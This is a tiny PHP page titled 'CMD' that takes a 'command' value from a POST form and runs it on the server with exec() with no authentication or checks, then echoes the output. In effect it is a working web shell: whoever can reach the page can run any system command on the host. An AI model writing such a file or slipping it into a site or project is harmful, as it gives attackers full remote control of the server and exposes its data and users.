<!DOCTYPE HTML>
<html lang="en">
<head>
<title>CMD</title>
    <link rel="stylesheet" href="style.css" type="text/css"/>
</head>
<body>
<?php
$command = "не определен";
if (isset($_POST["command"])){
    $command = $_POST["command"];
    $output=[];
    $retval=null;
    exec($command, $output, $retval);
    echo implode(' ',$output);
}
?>
</body>
</html>